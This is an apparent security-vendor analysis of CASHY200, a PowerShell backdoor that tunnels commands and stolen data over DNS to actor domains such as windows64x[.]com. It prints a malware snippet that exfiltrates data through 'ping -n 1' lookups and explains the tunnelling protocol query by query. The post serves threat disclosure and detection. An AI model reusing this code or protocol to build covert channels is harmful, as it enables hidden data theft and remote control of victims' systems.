In June\n2019, we observed one of these overlapping domains, specifically, windows64x[.]com, being used\nas the C2 server for a new PowerShell based backdoor that we’ve named CASHY200. This\nPowerShell backdoor used DNS tunneling to communicate with its C2 server, specifically by issuing\nDNS A queries to the actor controlled name server at the aforementioned domain. CASHY200\nparses data provided by the C2 server within DNS answers to run commands on the system and\nsend the results back to the C2 via DNS queries. In several samples, CASHY200 used randomly\n\n\n-----\n\ngenerated identifiers that are stored in the registry at HKCU\\Software\\Microsoft\\Cashe\\index and\nused the command value 200 to communicate with the C2 server. These details are the basis for\nthe name CASHY200.\n\nWhile we do not have telemetry showing how the CASHY200 PowerShell backdoor was delivered,\nin September 2019 we observed a host based in Kuwait beaconing to the windows64x[.]com\ndomain using the same DNS tunneling protocol as the CASHY200 payload. Fortunately, the\nbeaconing to this domain was blocked by our DNS security service, so the adversary was no longer\nable to communicate with their payload using this DNS tunnel. By analyzing the lineage of this tool,\nwe found that actors may have used CASHY200 when targeting Kuwait government organizations\nstarting in the spring of 2018 and continuing throughout 2019, according to our open source\ncollection efforts.\n\n## CASHY200 Attacks\n\nOn September 16, 2019, an organization based in Kuwait enabled our DNS Security subscription,\nwhich detected malicious DNS tunneling activity within minutes. The DNS tunnel was\ncommunicating with the windows64x[.]com domain, which we had previously linked to the xHunt\ncampaign that targeted shipping and transportation organizations in Kuwait. By blocking the DNS\ntunnel, the actor no longer had the ability to access the compromised systems. We do not have any\ntelemetry on the initial breach that resulted in the installation of the payload using the DNS tunnel.\n\nWhile investigating the activity, we found a CASHY200 PowerShell-based payload that\ncommunicated with windows64x[.]com. We analyzed this PowerShell script and found that its DNS\ntunneling protocol matched the outbound DNS requests at the Kuwait organization which were\nblocked by DNS Security. We will provide an analysis of CASHY200 and its DNS tunneling protocol\nin a later section of this blog.\n\nAfter gathering additional CASHY200 samples, we observed evidence that the threat group was\nactively developing this PowerShell-based tool for use in their attack campaigns. While researching\nthis evolution, we found several samples that date back to May and June of 2018. On May 1 and\nJune 3, 2018, we first saw executables that installed and executed CASHY200 PowerShell scripts\nthat communicated with the domains windows-updates[.]com and firewallsupports[.]com,\nrespectively. We do not have telemetry to determine the organizations that were impacted by these\npayloads, however, the [Tweets by](https://twitter.com/Voulnet/status/1014951078364876801) [@Voulnet seen in Figure 1 suggest that Word documents were](https://twitter.com/Voulnet)\nused to deliver PowerShell payloads using firewallsupports[.]com as a C2 to target government\norganizations in Kuwait.\n\n\n-----\n\n_Figure 1. Tweet by @Voulnet suggesting that PowerShell-based payloads communicating with_\n_firewallsupports[.]com were used to target the Kuwait government_\n\nWhile we are unable to confirm that this threat group used CASHY200 payloads configured to\ncommunicate with firewallsupports[.]com to target government organizations in Kuwait, we did\ndiscover Word documents that installed CASHY200 payloads configured with the aforementioned\ndomain as its C2 which also contained the logo of a Kuwait government organization as part of its\nsocial engineering lure image. This aligns with the general targeting observed in the xHunt\n\n\n-----\n\ncampaign, in which the attacks were solely on Kuwait organizations. Table 1 lists the Word\ndocuments seen installing CASHY200, which shows another C2 domain, winx64-microsoft[.]com,\nused by this threat group.\n\n**Modified time** **SHA256** **Filename** **C2 domain**\n\n8/20/2018 7:00:00 bce37fc0...ﻋﯿﺪ اﻷﺿﺤﻰ.docm firewallsupports[.]com\n\n8/13/2018 9:07:00 5a3c156...دﻟﯿﻞ ﺗﺴﺠﯿﻞ اﻟﺪﺧﻮل.docm firewallsupports[.]com\n\n1/1/1980 0:00:00 45b2db5...

Malicious Word documents installing CASHY200 payloads_\n\nAlso of interest, on May 14, 2019, an individual posted on Microsoft’s [TechNet forum requesting](https://social.technet.microsoft.com/Forums/en-US/0d3bb3c9-eef3-4754-8557-99e982407ad7/nt-authoritysystem-is-pinging-to-a-certain-site-everytime?forum=winserversecurity)\ninformation on an activity they observed on two of their servers that involved the domain\nwindows64x[.]com. The activity described by the individual is tunneling activity to the same C2\ndomain using the same DNS tunneling protocol that we blocked at the Kuwait government\norganization. While we cannot confirm the organization experiencing this activity, based on the\ndetails provided in the forum post, we believe that the individual also worked at another Kuwait\ngovernment organization.\n\nAnother interesting detail provided in the post to TechNet was that the queries for the DNS tunnel\nwere generated using the command ping -n 1 <domain>. We observed the same technique to issue\nqueries for a DNS Tunnel in a CASHY200 sample configured with firewallsupports[.]com as the C2,\nas depicted in the code in Figure 2. If a user (or malicious script in this case) provides a domain to\nthe ping command, the application will attempt to resolve the domain before sending the ICMP\nmessages to ping the remote system. Using the ping application in this manner effectively sends\nthe query for the DNS tunnel.\n\n\n1\n2\n3\n\n\n$domain = $rnd + $in + $id + $coun + $data +\n'.firewallsupports[.]com'\n$get = cmd /c ping -n 1 $domain\n\n\n_Figure 2. Code in CASHY200 sample using ping -n 1 to issue DNS queries to_\n_firewallsupports[.]com_\n\nSimilarly, we observed another CASHY200 sample that used the nslookup command in the same\nmanner as the ping sample except to communicate using the domain windows64x[.]com. This\nsample used nslookup -type=a <domain> to issue the DNS queries and further strengthens the\nrelationship between the two domains.\n\n## CASHY200 DNS Tunneling Protocol\n\n\n-----\n\nWe analyzed the file(SHA256:\neccc65711cbd154f680e8c8ef343d53f29e4a6237510abd4ad1eab5742b035b3) in order to\nunderstand the capabilities of the payload and the DNS tunneling protocol that was blocked at the\nKuwait organization. This sample communicates with the domain windows64x[.]com. The DNS\ntunneling protocol relies on DNS A queries to send data from the Trojan to the C2 server within the\nsubdomain of the queried domain and receive data within the IPv4 answer from the C2 server. At a\nhigh level, the CASHY200 sample associated with this activity can issue two different commands,\nseen in Table 2 by answering the initial beacon query with an IPv4 answer that has either 48 or 92\nas its first octet.\n\n\n**Command**\n**in IPv4**\n\n\n**Description of Command**\n\n\n48.x.x.x Run ‘hostname’ command and send the results to the C2 over DNS tunnel.\n\n\n92.<# of\nqueries>.x.x\n\n\nObtain command to run from the answers to subsequent DNS queries and send\nthe results to the C2 over DNS tunnel. Second octet is used to notify the payload\nhow many DNS queries to issue to obtain the command\n\n\n_Table 2. Commands available within CASHY200 and their functionality_\n\nOlder samples of CASHY200 that used windows-updates[.]com and firewallsupports[.]com for their\nC2 domains only had one command available that it would issue by including 200 as its first octet of\nthe IPv4 answer. This command had the same functionality as the 92 command seen in Table 2\nabove. In these older samples, the 48 command was not needed as they would provide the\nhostname of the system within the initial beacon instead of requesting it from the C2. The command\nvalue of 200 is the basis for the latter part of the CASHY200 name.\n\nIn general, the domains generated by CASHY200 for its DNS tunnel will be structured as seen in\nFigure 3. The sequence number and data for exfiltration fields are optional and are often blank\ndepending on the Trojan's request type. For instance, the first DNS query that acts as a beacon\ndoes not have a sequence number or data exfiltration field. In addition, older samples of\nCASHY200 use 4 random characters instead of 5.\n\n<5 random characters><hexlified request type><hexlified unique\n\nhostname><sequence number><data for\n\nexfiltration>.windows64x[.]com\n\n_Figure 3. Structure of the DNS queries generated by CASHY200 for its DNS tunneling protocol_\n\nThe request type field allows CASHY200 to tell the C2 server the purpose of the DNS query it\nissued. This allows the C2 server to respond to the inbound query with the appropriate IPv4\naddress within the DNS answer. Table 3 provides all of the available request types and the purpose\nof the DNS query. It is important to note that CASHY200 samples using windows64x[.]com as a C2\nserver can receive commands within the response to both the d or the q request types, whereas\nolder samples can only process commands from responses to the q request type.\n\n**Request type** **Description**\n\n\n-----\n\nd Initial ‘hello’ beacon.\n\nq Requesting command beacon.\n\nf Finished sending results.\n\nc Sending number of upcoming queries to send the custom command results.\n\nh Obtaining data from C2 within IPv4 answers.\n\na Sending hostname command results within subdomain.\n\nr Sending custom command results within subdomain.\n\n_Table 3. Request types that CASHY200 will use to notify C2 of the purpose of each DNS query_\n\nIn the CASHY200 tunnel that was blocked by DNS Security, the <hexlified unique hostname> was\na string hardcoded by the actor into the Trojan, which appears unique to the infected system. This\nhardcoded hostname suggested that the threat actor created the CASHY200 sample specifically for\nthe compromised host, which also allowed us to quickly determine the infected hosts to triage\nremediation efforts. Older samples of CASHY200 use randomly generated identifiers that the\nTrojan stores in the registry, one location was HKCU\\Software\\Microsoft\\Cashe\\index, which was\nthe basis of the front portion of the name CASHY200.\n\nAs previously mentioned, the sequence number only appears within the queried subdomain when\nCASHY200 sends data to the C2 server. CASHY200 will start the sequence number at 101 and\nincrement this value each query it sends until it has transmitted all of the data to the C2.\n\n## CASHY200 DNS Tunnel Example\n\nTo understand and visualize the DNS tunneling protocol used by CASHY200, we created a C2\nserver to interact with and issue commands to the backdoor. We created the C2 server to interact\nwith the CASHY200 sample configured with windows64x[.]com which can process two commands:\n48 or 92 within the first octet of the DNS A record answer (see Table 2 for command description).\nFigure 4 below shows a network packet capture of CASHY200 interacting with our C2 server. This\nimage shows CASHY200 receiving the ‘hostname’ command followed by a custom command of\n‘whoami’, both of which the backdoor will run and transmit the results back to the C2.\n\nOf note, Figure 4 shows the DNS server responding to these queries with 1.2.3.4, which is just a\nplaceholder we included in our C2 server as CASHY200 ignores the DNS response when sending\ndata.\n\n\n-----\n\n_Figure 4. DNS traffic associated with CASHY200 receiving and responding to the ‘hostname’_\n_followed by a custom command ‘whoami’_\n\nIn Figure 4, the first DNS query to resolve is\nyFIOr645245444143544544.windows64x[.]com which acts as an initial beacon. The first five\ncharacters (yFIOr) are random and have no purpose other than generating random subdomains in\norder to avoid DNS caching. The next two characters (64) signify the Hex notation of the d request\ntype, which is the request type for the initial beacon as noted in Table 3. The request type is\nfollowed by the system specific hostname hardcoded into the sample, which in this case is\n5245444143544544 for <REDACTED>.\n\nTo issue the 48 command to get the hostname of the system, the C2 server responds to the initial\nbeacon query with 48 as the first octet of the IPv4 answer, specifically 48.0.0.0. The C2 server does\nnot have to issue this IPv4 specifically to issue the ‘hostname’ command, as CASHY200 ignores\nthe remaining three octets and runs the 'hostname' command. Our test system had a hostname of\ntest-system-ftw, which CASHY200 sends to the C2 server in a sequence of DNS queries to resolve\nthe following:\n\n1. pevtF6152454441435445443130316447567a6443317a65584e305a57303d.windows64x[.]com\n2. diosk6152454441435445443130324c575a3064773d3d.windows64x[.]com\n3. weDlz615245444143544544313033.windows64x[.]com\n\nThese DNS queries contain the results of the ‘hostname’ command using the request type a (61) in\nthe subdomain of the three queries) in order to transmit the data. Following the request type is the\ndata to be sent within these DNS queries The C2 server uses sequence numbers to put the\n\n\n-----\n\nqueries in the correct order before base64 decoding the data in each query. In our example, the\ndata, which converted from hexadecimal notation results in 101dGVzdC1zeXN0ZW0=,\n102LWZ0dw== and 103. The C2 server then concatenates the decoded data from each query to\ncreate the results. Table 4 shows how the C2 would process the ‘hostname’ command results sent\nby CASHY200 to produce test-system-ftw.\n\n**Sequence Number** **Encoded Data** **Decoded Data**\n\n101 dGVzdC1zeXN0ZW0= test-system\n\n102 LWZ0dw== -ftw\n\n103 <no data>\n\n_Table 4. Our C2 processing data sent by CASHY200 in response to the ‘hostname’ command_\n\nAfter sending the results of the ‘hostname’ command, CASHY200 issues the\nUDmEJ665245444143544544.windows64x[.]com DNS query with the request type f (66 in the\nsubdomain) to notify the C2 it is done sending data. After sending the results of the ‘hostname’\ncommand, CASHY200 issues a query to resolve GmhpF715245444143544544.windows64x[.]com\nwith a request type of q (71 in the subdomain). CASHY200 issues this request to obtain a custom\ncommand from the C2 server to run in command prompt.\n\nThe packet capture in Figure 4 shows our C2 server responding to the CASHY200 query with a\nrequest type of q and IPv4 address of 92.2.0.0. As mentioned in Table 2, CASHY200 will parse this\nIPv4 as a custom command with the first octet of the IPv4 (92) signaling the issued custom\ncommand and the second octet (2) as the number of DNS queries the backdoor must issue to\ndownload the entire command from the C2 server’s answers to queries. The command data is\nissued via IPv4 addresses within the DNS answers, which is a very inefficient way of transmitting\ndata as the C2 can only send four bytes of data for each DNS query the Trojan issues.\n\nBased on the answer 92.2.0.0, CASHY200 issues the following two DNS queries, both of which\nhave a request type of h (68 in the subdomains) and sequence numbers of 100 and 101 (313030\nand 313031 in the subdomains):\n\n1. iQKEe685245444143544544313030.windows64x[.]com\n2. TyxLC685245444143544544313031.windows64x[.]com\n\nThe C2 server answers these two queries with the IPv4 addresses 119.104.111.97 and\n109.105.0.0, which CASHY200 processes by treating each octet as a byte of data and\nconcatenating all the bytes to receive the command. For instance, Table 5 shows how CASHY200\nwould process the two IPv4 answers to obtain the command ‘whoami’.\n\n**IPv4 Answer** **Octets in Ascii** **Resulting string**\n\n119.104.111.97 ‘w’.’h’.’o’.’a’ whoa\n\n109.105.0.0 ‘m’.’i’.’\\x00’.’\\x00’ mi\n\n\n-----\n\n_Table 5. CASHY200 processing IPv4 answers from our C2 to get a custom command to run_\n_‘whoami’_\n\nAfter running the custom command ‘whoami’, CASHY200 sends the results to the C2 server in a\nslightly different manner than how it sends the results of the ‘hostname’ command discussed\nearlier. CASHY200 begins sending the results of the custom command by issuing a query to\nresolve YqpZf6352454441435445443.windows64x[.]com, which contains a request type of c (63 in\nthe subdomain) and the number 3 as the data field. CASHY200 uses the number in the data field of\nthis request to notify the C2 how many queries it will send to transmit the results of the custom\ncommand.\n\nAfter sending the count of queries required to transmit the results, CASHY200 issues the following\nthree queries, all of which have a request type of r (72 in the subdomains):\n\n1. QMNnv7252454441435445443130316447567a6443317a65584e305a57303d.windows64x[.]com\n2. OlBCh7252454441435445443130324c575a30643178305a584e304c513d3d.windows64x[.]com\n3. XUkra72524544414354454431303364584e6c63673d3d.windows64x[.]com\n\nThe three queries used to send the results of the custom command include a sequence number\nstarting at 101 that increments each query followed by data, all of which is represented as\nhexadecimal bytes. After converting the hexadecimal bytes, the queries contain\n101dGVzdC1zeXN0ZW0=, 102LWZ0d1x0ZXN0LQ==, and 103dXNlcg==, which shows the\nincrementing sequence numbers followed by the base64 encoded results of the custom ‘whoami’\ncommand, which in our test case was test-system-ftw\\test-user. Table 6 shows how the C2 server\nwill process the three queries issued by CASHY200 to transmit the results of the custom command.\n\n**Sequence Number** **Encoded Data** **Decoded Data**\n\n101 dGVzdC1zeXN0ZW0= test-system\n\n102 LWZ0d1x0ZXN0LQ== -ftw\\test\n103 dXNlcg== user\n\n_Table 6. Our C2 processing data sent by CASHY200 in response to the custom command ‘whoami’_\n\nAfter sending the results of the custom ‘whoami’ command, CASHY200 issues the DNS query\nfvSwZ665245444143544544.windows64x[.]com with the request type f (66 in the subdomain) to\nnotify the C2 it is done sending data.\n\n## Conclusion\n\n[According to our initial publication, the xHunt Campaign targeted Kuwait organizations using](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\nseveral custom tools to compromise systems. We discovered another custom tool that we call\nCASHY200, which is a PowerShell-based backdoor that communicates with a C2 server using\nDNS tunneling. We found evidence through open source collection that this threat group used\nCASHY200 to target Kuwait government organizations.
